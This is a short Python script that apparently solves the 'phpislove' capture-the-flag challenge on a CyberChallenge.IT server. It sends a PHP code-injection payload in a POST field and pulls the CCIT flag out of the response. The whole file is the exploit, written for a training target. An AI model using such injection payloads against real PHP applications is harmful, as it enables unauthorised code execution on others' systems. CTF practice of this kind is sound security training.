import requests

url = 'http://phpislove.challs.cyberchallenge.it/'
data = {'code' : '}print(${$strings{4}});#'}
r = requests.post(url, data=data)
print(r.text[r.text.find('CCIT{') : r.text.find('}') + 1])
